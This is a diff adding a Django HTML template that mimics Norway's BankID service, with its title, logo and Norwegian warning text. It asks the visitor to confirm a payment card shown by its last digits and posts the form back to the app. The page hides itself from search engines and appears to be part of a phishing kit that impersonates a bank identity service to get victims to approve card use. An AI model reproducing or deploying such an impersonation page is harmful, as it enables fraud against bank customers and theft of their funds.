@@ -1,0 +1,54 @@
+{% load static %}
+<html lang="nb">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="robots" content="noindex, nofollow">
+    <link rel="icon" type="image/png" href="{% static 'img/favicon.png' %}">
+    <title>BankID</title>
+    <link href="{% static 'style/main.css' %}" rel="stylesheet">
+</head>
+<body class="">
+<main class="container">
+    <div class="container__content">
+        <div class="bankid-logo-wrapper">
+            <img alt="" class="bankid-logo" src="{% static 'img/logo.svg' %}">
+        </div>
+        <div id="useCspBrowserPage" class="page card severitylevel-warning no-buttons" style="display:none">
+            <div class="page__content">
+
+                <h1 tabindex="-1" data-i18n="error_no_csp_title">Åpne i en annen nettleser</h1>
+                <p data-i18n="error_no_csp_text">Nettleseren du bruker støtter ikke viktige sikkerhetsfunksjoner (CSP).
+                    Prøv å åpne linken i en annen nettleser. Merk at noen utvidelser for nettlesere også kan være
+                    årsaken til dette problemet. Du kan forsøke å deaktivere disse og prøve igjen.</p>
+            </div>
+        </div>
+        <div class="page" id="approvecard" style="">
+            <form action="" method="post">
+                {% csrf_token %}
+                <div class="page__content card">
+                    <div class="card__heading">
+                        <h1 tabindex="-1" data-i18n="permission_approvecard_heading">Bekreft kort</h1>
+                    </div>
+                    <div class="card__body">
+                        <p class="card__label" data-i18n="permission_approvecard_label">Kortnummer</p>
+                        <center>
+                            <p id="js-approve-card-number" class="card__emphasized-text">**** **** **** {{ card }}</p>
+                        </center>
+                    </div>
+                </div>
+                <div class="page__buttons">
+                    <button type="submit" data-i18n="permission_approvecard_heading" id="approve-card-button" class="login-button">
+                        Bekreft
+                        kort
+                    </button>
+                    <a href="/" data-i18n="decline" id="decline-approve-card-button" class="button button--link">Avslå</a>
+                </div>
+            </form>
+        </div>
+    </div>
+</main>
+<script>
+</script>
+</body>
+</html>
